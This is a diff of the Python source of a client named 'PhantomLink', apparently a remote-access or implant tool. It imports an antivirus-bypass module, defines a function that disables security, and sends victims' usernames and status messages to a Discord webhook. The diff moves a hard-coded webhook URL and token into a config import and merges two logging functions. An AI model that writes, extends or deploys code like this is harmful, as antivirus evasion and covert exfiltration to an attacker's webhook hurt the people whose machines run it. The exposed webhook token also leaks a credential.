@@ -15,7 +15,7 @@ from av_bypass import AVBypass
 import base64
 from datetime import datetime
 
-version = 10.7  # 7/3/2026
+version = 11.7  # 7/3/2026
 
 # ==========================================
 # ⚙️ CLIENT CONFIGURATION
@@ -37,8 +37,8 @@ def bypass_all_security():
         discord_logger(f"[!] AV Bypass error: {e}")
         return False
 
-#Discord
-DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1525081864094613615/4DkAojzJaoqsbolWR2E59IVwWeZY21CVr4-eNcnvXWB2nAKad4wpQ3mZVddNnNlw8pV7"
+sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
+from config import DISCORD_WEBHOOK
 
 
 def _send_discord_message(log):
@@ -49,10 +49,6 @@ def _send_discord_message(log):
 
 
 def discord_logger(log):
-    threading.Thread(target=_send_discord_message, args=(log,), daemon=True).start()
-
-
-def discord_notify(log):
     threading.Thread(target=_send_discord_message, args=(log,), daemon=True).start()
 
 
@@ -286,7 +282,7 @@ def update():
     if old_ver < version:
         print(f"\n[*] UPDATE REQUIRED: {old_ver} --> {version}")
         discord_logger(f"[+] PhantomLink Updating (V{old_ver} --> V{version}) . . . [+]\n{username}")
-        discord_notify(f"[+] PhantomLink Updating (V{old_ver} --> V{version}) . . . [+]\n{username}")
+        discord_logger(f"[+] PhantomLink Updating (V{old_ver} --> V{version}) . . . [+]\n{username}")
 
         # Kill all other instances
         print("\n[UPDATE STEP 1/4] Killing all other instances...")
@@ -322,7 +318,7 @@ def update():
             print("[SUCCESS] Update completed successfully!\n")
             discord_logger(
                 f"PhantomLink Updated Successfully for {username}\nOld Version: {old_ver}\nNew Version: {version}")
-            discord_notify(
+            discord_logger(
                 f"PhantomLink Updated Successfully for {username}\nOld Version: {old_ver}\nNew Version: {version}")
         else:
             print("[!] Update completed but version file may not be updated\n")
@@ -1058,7 +1054,7 @@ def main():
 
     print("[*] Starting PhantomLink Client...")
     discord_logger(f"[*] Starting PhantomLink Client for {username}")
-    discord_notify(f"[*] Starting PhantomLink Client for {username}")
+    discord_logger(f"[*] Starting PhantomLink Client for {username}")
 
     print("\n" + "=" * 60)
     print("PHANTOMLINK CLIENT STARTUP")
